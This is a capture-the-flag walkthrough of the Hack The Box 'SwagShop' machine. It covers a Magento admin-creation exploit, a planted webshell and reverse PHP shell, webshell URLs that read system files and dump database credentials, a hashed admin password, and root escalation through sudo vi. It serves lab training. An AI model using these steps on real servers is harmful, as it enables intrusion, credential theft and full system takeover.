# SwagShop

### Preface

This box had so many people fucking with it that I bought VIP.

#### Process
- Add account via exploit - https://www.exploit-db.com/exploits/37811
  - Blogs about the exploit mentioned that it was commonly exploited and coupled with a file editing plugin to get a shell
- While poking around came accross /app/
  - This lead to finding the config file in `local.xml`
- Use file IDE to add webshell to /app/Mage.php file. [took a metric ton of googling](http://connect20.magentocommerce.com/community/Magpleasure_Filesystem/1.0.0/Magpleasure_Filesystem-1.0.0.tgz)
  - later used pentest monkey reverse php shell and overwrote install.php instead. I think stalling mage.php was fucking up the app.
- Use shell cat `/etc/passwd` to find home user
- cat user.txt `http://10.10.10.140/app/Mage.php?cmd=cat%20/home/haris/user.txt`
- use webshell + mysql creds from `local.xml` to list records in admin_user. Contains user `haris`'s hashed+salted creds
  - `http://10.10.10.140/app/Mage.php?cmd=mysql%20-u%20%22root%22%20%22-pfMVWh7bDHpgZkyfqQXreTjU9%22%20%20%22swagshop%22%20-e%20%22select%20*%20from%20admin_user%22`
  - 8512c803ecf70d315b7a43a1c8918522:lBHk0AOG0ux8Ac4tcM1sSb1iD5BNnRJp
- After throwing it through rockyou.txt I decided to look for other avenues.
- Use Pentest monkey to get a real reverse shell
- Try a few enumeration techniques after getting a proper shell `python3 -c 'import pty; pty.spawn("/bin/sh")'`
  - `find / -type f \( -perm -4000 -o -perm -2000 \) -exec ls -l {} \;`
  - `find / -perm -o+w `
  - `sudo -l`
- Third time's a charm

```
sudo -l
Matching Defaults entries for www-data on swagshop:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on swagshop:
    (root) NOPASSWD: /usr/bin/vi /var/www/html/*

```
- `sudo /usr/bin/vi /var/www/html/*`
- `:!bash` for root shell

#### Pwnd
```
root@swagshop:/var/www/html# cat /root/root.txt
cat /root/root.txt
c2b087d66e14a652a3b86a130ac56721

   ___ ___
 /| |/|\| |\
/_| ´ |.` |_\           We are open! (Almost)
  |   |.  |
  |   |.  |         Join the beta HTB Swag Store!
  |___|.__|       https://hackthebox.store/password

                   PS: Use root flag as password!

```
